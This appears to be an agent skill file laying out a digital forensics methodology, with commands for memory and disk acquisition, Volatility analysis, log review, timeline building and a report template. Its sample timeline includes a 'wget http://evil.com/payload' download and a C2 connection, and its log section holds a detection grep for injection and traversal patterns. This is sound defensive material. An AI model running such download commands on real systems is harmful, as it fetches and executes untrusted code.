---
name: computer-forensics
description: "Digital forensics methodology for evidence collection, disk/memory analysis, timeline reconstruction, chain of custody, and incident artifact examination. Covers file carving, metadata extraction, and forensic reporting."
auto_invoke: false
tags: [security, forensics, dfir, incident-response, evidence, analysis]
---

# Computer Forensics Skill

Structured digital forensics methodology for investigating security incidents, analyzing compromised systems, and preserving evidence with proper chain of custody.

## When to Invoke

- Post-incident investigation requiring evidence preservation
- Malware analysis or suspicious file examination
- Disk/memory forensic analysis
- Timeline reconstruction of security events
- Legal/compliance-driven evidence collection

## Forensic Investigation Protocol

### Phase 1: Preparation & Scope

```
CASE ID: [CASE-YYYY-MM-DD-NNN]
INCIDENT TYPE: [Malware | Intrusion | Data Breach | Insider Threat | Fraud]
SCOPE: [Systems/devices to examine]
AUTHORITY: [Who authorized the investigation]
CHAIN OF CUSTODY: [Initiated by whom, when]
TOOLS: [Forensic tools available]
```

**Golden Rule**: Never modify the original evidence. Always work on copies.

### Phase 2: Evidence Collection

#### Order of Volatility (collect in this order)
1. **CPU registers, cache** (nanoseconds)
2. **RAM / running processes** (seconds)
3. **Network connections** (seconds)
4. **Temporary files / swap** (minutes)
5. **Disk / persistent storage** (stable)
6. **Remote logs / backups** (stable)
7. **Physical evidence** (stable)

#### Memory Acquisition
```bash
# Linux - LiME
insmod lime.ko "path=/evidence/memory.lime format=lime"

# Windows - WinPmem
winpmem_mini_x64.exe /output/memory.raw

# Verify integrity
sha256sum /evidence/memory.lime > /evidence/memory.lime.sha256
```

#### Disk Imaging
```bash
# Create forensic image with hash verification
dc3dd if=/dev/sda of=/evidence/disk.dd hash=sha256 log=/evidence/imaging.log

# Or with ewfacquire (Expert Witness Format)
ewfacquire /dev/sda -t /evidence/disk -C "Case ID" -D "Description"

# Verify
sha256sum /evidence/disk.dd
```

#### Network Evidence
```bash
# Capture active connections
netstat -antp > /evidence/netstat.txt
ss -tunlp > /evidence/ss.txt

# DNS cache
ipconfig /displaydns > /evidence/dns_cache.txt  # Windows
cat /etc/resolv.conf && systemd-resolve --statistics  # Linux

# ARP table
arp -a > /evidence/arp.txt
```

### Phase 3: Analysis Techniques

#### File System Analysis
```bash
# Timeline generation (Sleuth Kit)
fls -r -m "/" /evidence/disk.dd > /evidence/bodyfile.txt
mactime -b /evidence/bodyfile.txt -d > /evidence/timeline.csv

# Deleted file recovery
foremost -i /evidence/disk.dd -o /evidence/recovered/
photorec /evidence/disk.dd

# File signature verification
file recovered_file
xxd recovered_file | head -20
```

#### Metadata Extraction
```bash
# EXIF data from images
exiftool suspicious_image.jpg

# PDF metadata
pdfinfo suspicious.pdf
strings suspicious.pdf | grep -i "author\|creator\|producer"

# Office document metadata
olevba suspicious.docm  # Macro extraction
oleid suspicious.docx    # OLE indicators

# Windows PE analysis
pe-sieve /pid:<PID>
pestudio suspicious.exe
```

#### Memory Forensics (Volatility 3)
```bash
# Process listing
vol -f memory.raw windows.pslist
vol -f memory.raw windows.pstree

# Network connections
vol -f memory.raw windows.netscan

# Command history
vol -f memory.raw windows.cmdline

# DLL injection detection
vol -f memory.raw windows.malfind

# Registry hives
vol -f memory.raw windows.registry.hivelist

# Suspicious handles
vol -f memory.raw windows.handles --pid <PID>
```

#### Log Analysis
```bash
# Windows Event Logs (key events)
# 4624 - Successful logon
# 4625 - Failed logon
# 4648 - Logon with explicit credentials
# 4688 - Process creation
# 4698 - Scheduled task created
# 7045 - Service installed
# 1102 - Audit log cleared (SUSPICIOUS)

# Linux auth logs
grep -E "Failed|Accepted|session opened" /var/log/auth.log
journalctl -u sshd --since "2026-04-01"

# Web server logs
grep -E "union.*select|exec\(|\.\./" /var/log/apache2/access.log
```

### Phase 4: Timeline Reconstruction

Build a unified timeline from all evidence sources:

```markdown
| Timestamp (UTC) | Source | Event | Details | Significance |
|-----------------|--------|-------|---------|-------------|
| 2026-04-01 03:14:22 | auth.log | SSH login | root from 203.0.113.42 | Initial access |
| 2026-04-01 03:14:45 | bash_history | Command | wget http://evil.com/payload | Malware download |
| 2026-04-01 03:15:01 | syslog | Process | /tmp/.hidden executed | Payload execution |
| 2026-04-01 03:16:30 | netstat | Connection | 203.0.113.42:4444 ESTABLISHED | C2 connection |
| 2026-04-01 03:20:00 | lastlog | SSH login | lateral to 10.0.0.5 | Lateral movement |
```

### Phase 5: Malware Analysis (Static)

```bash
# Hash identification
sha256sum suspicious_file
# Check against VirusTotal, MalwareBazaar

# String extraction
strings -a suspicious_file | grep -iE "http|ftp|cmd|powershell|base64"

# PE header analysis
readpe suspicious.exe
objdump -x suspicious.exe

# Entropy analysis (high entropy = packed/encrypted)
ent suspicious_file

# YARA rule matching
yara -r rules/ suspicious_file
```

### Phase 6: Forensic Report

```markdown
## Digital Forensics Report

**Case ID**: [CASE-YYYY-MM-DD-NNN]
**Examiner**: [Name]
**Date**: [Report date]
**Classification**: [Confidential/Internal/Public]

### Executive Summary
[2-3 sentences: what happened, impact, key findings]

### Evidence Inventory
| # | Item | Type | Hash (SHA-256) | Acquisition Date | Custodian |
|---|------|------|----------------|------------------|-----------|

### Timeline of Events
[Chronological reconstruction from Phase 4]

### Technical Findings
1. **Finding**: [Description]
   **Evidence**: [Source file/log, line number]
   **Significance**: [What this means for the investigation]

### IOCs Extracted
| Type | Value | Context |
|------|-------|---------|
| IP | 203.0.113.42 | C2 server |
| Hash | sha256:abc... | Malware payload |
| Domain | evil.example.com | Staging server |
| File Path | /tmp/.hidden | Persistence mechanism |

### Chain of Custody Log
| Date | Action | By | Notes |
|------|--------|----|-------|

### Conclusions
[Summary of what the evidence proves/suggests]

### Recommendations
1. [Immediate remediation]
2. [Detection improvement]
3. [Policy/process changes]
```

## Integration with Agentic Substrate

- Extends `@security-auditor` with post-breach investigation capability
- Feeds IOCs to `threat-hunting` skill for detection rule creation
- Coordinates with `@incident-commander` during active responses
- Evidence feeds `@brahma-investigator` root cause analysis

## Source
Methodology based on NIST SP 800-86, SANS DFIR, and adapted from mhattingpete/claude-skills-marketplace forensics patterns.
